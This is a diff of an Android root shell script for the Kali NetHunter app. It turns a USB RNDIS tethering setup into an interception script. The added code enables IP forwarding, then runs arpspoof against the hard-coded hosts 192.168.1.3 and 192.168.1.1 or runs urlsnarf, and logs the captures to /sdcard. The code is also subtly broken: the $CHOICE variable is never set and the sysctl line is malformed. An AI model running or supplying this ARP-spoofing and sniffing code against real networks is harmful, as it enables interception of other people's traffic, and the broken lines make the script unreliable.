@@ -1,89 +1,68 @@
 #!/system/bin/sh
+echo ""
+echo ""
+echo "If you get error that rndis0 isnt up then use usb arsenal to activate rndis and use"
+echo "Android su: ifconfig rndis0 up"
+echo ""
+echo ""
+# Export needed paths for chroot commands
+
+## Define the nethunter app package name.
+APP_PGK_NAME=com.offsec.nethunter
+
+## Define the root directory path of chroot containers
+NHSYSTEM_PATH=/data/local/nhsystem
+
+## Define chroot sudo path
+CHROOT_EXEC=/usr/bin/sudo
+
+## Combine android $PATH to kali chroot $PATH
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
+
+## Define busybox path.
+BUSYBOX=`which busybox_nh | head -n1`
+if [ -z "$BUSYBOX" ]; then
+    if [ -x "/system/xbin/busybox_nh" ]; then
+        BUSYBOX="/system/xbin/busybox_nh"
+    elif [ -x "/system/bin/busybox_nh" ]; then
+        BUSYBOX="/system/bin/busybox_nh"
+    elif [ -x "/data/data/$APP_PGK_NAME/files/scripts/bin/busybox_nh" ]; then
+        BUSYBOX="/data/data/$APP_PGK_NAME/files/scripts/bin/busybox_nh"
+    fi
+fi
+
+## Define the Kali Chroot path.
+MNT=`readlink -e $NHSYSTEM_PATH/kalifs`
+if [ -z "$MNT" ]; then
+    MNT=`cat /data/data/$APP_PGK_NAME/shared_prefs/$APP_PGK_NAME.xml | grep "\"chroot_path\"" | sed "s/^.*\"chroot_path\">\(.*\)<\/string>/\1/g"`
+fi
+
+## Define the path of xz tool
+XZ=/data/data/$APP_PGK_NAME/files/scripts/bin/xz
 
 TMPDIR=/data/local/tmp
-mkdir -p $TMPDIR
+su -c mkdir -p $TMPDIR
+su -c mkdir /sdcard/nh_files/simple_usb
 INTERFACE=rndis0
 UPSTREAM=wlan0
 
-# Check required tools
-if ! busybox ls > /dev/null;then
-    echo No busybox found
-    exit 1
-fi
-if ! dnsmasq -v > /dev/null;then
-    echo No dnsmasq found
-    exit 1
-fi
-if ! busybox test -e /sys/class/android_usb/android0/f_rndis;then
-    echo "Device doesn't support RNDIS"
-    exit 1
-fi
-if ! iptables -V;then
-    echo iptables not found
-    exit 1
-fi
 
-# We have to disable the usb interface before reconfiguring it
-echo 0 > /sys/devices/virtual/android_usb/android0/enable
-echo rndis > /sys/devices/virtual/android_usb/android0/functions
-echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
-echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
-echo 1 > /sys/devices/virtual/android_usb/android0/enable
+# Endo of exports
 
-# Check whether it has applied the changes
-cat /sys/devices/virtual/android_usb/android0/functions
-cat /sys/devices/virtual/android_usb/android0/enable
+# Set rndis up
+$BUSYBOX chroot $MNT sudo ifconfig $INTERFACE up
+$BUSYBOX chroot $MNT sudo sysctl -w net.ipv4.ip_forward=1 net.ipv4.ip_forward = 1
 
-# Wait until the interface actually exists
-while ! busybox ifconfig $INTERFACE > /dev/null 2>&1;do
-    echo Waiting for interface $INTERFACE
-    busybox sleep 1
-done
+case $CHOICE in
+1)
+$BUSYBOX chroot $MNT sudo arpspoof -i rndis0 -t 192.168.1.3 -r 192.168.1.1 > /sdcard/nh_files/simple_usb/arpspoof1.log
+;;
+2)
+$BUSYBOX chroot $MNT sudo arpspoof -i rndis0 -t 192.168.1.1 -r 192.168.1.3 > /sdcard/nh_files/simple_usb/arpspoof1.log
 
-# Configure interface, firewall and packet forwarding
-#busybox ifconfig $INTERFACE inet 10.0.0.1 netmask 255.255.255.0 up
+;;
+3)
+urlsnarf -i rndis0 > /sdcard/nh_files/simple_usb/urlsnarf.log
+;;
 
-ip addr flush dev $INTERFACE
-ip addr add 10.0.0.1/24 dev $INTERFACE
-ip link set $INTERFACE up
-
-for table in $(ip rule list | awk -F"lookup" '{print $2}');
-do
-DEF=`ip route show table $table|grep default|grep $UPSTREAM`
-if ! [ -z "$DEF" ]; then
-   break
-fi
-done
-
-ip route add 10.0.0.0/24 dev $INTERFACE scope link table $table
-ip route add default via 10.0.0.1 dev $INTERFACE
-
-iptables -I FORWARD 1 -i $INTERFACE -j ACCEPT
-iptables -t nat -I POSTROUTING 1 -j MASQUERADE
-iptables -D natctrl_FORWARD -j DROP
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# dnsmasq -H /data/local/tmp/hosts -i $INTERFACE -R -S 8.8.8.8 -F 10.0.0.100,10.0.0.200 -x $TMPDIR/dnsmasq.pid
-dnsmasq -C /sdcard/nh_files/configs/dnsmasq.conf -x $TMPDIR/dnsmasq.pid -i $INTERFACE
-
-## log-facility=/sdcard/nh_files/dnsmasq.log
-## #address=/#/10.0.0.1
-## #address=/google.com/10.0.0.1
-## interface=rndis0
-## dhcp-range=10.0.0.10,10.0.0.250,12h
-## dhcp-option=3,10.0.0.1
-## dhcp-option=6,10.0.0.1
-## #no-resolv
-## log-queries
-## server=208.67.222.222
-
-#echo "Hit enter to kill me"
-#read
-#pkill dnsmasq
-## Restoring iptables rules
-#iptables -D FORWARD -i $INTERFACE -j ACCEPT
-#iptables -t nat -D POSTROUTING -j MASQUERADE
-#iptables -A natctrl_FORWARD -j DROP
-## Remove iface and routes
-#ip addr flush dev $INTERFACE
-#ip link set $INTERFACE down
+esac
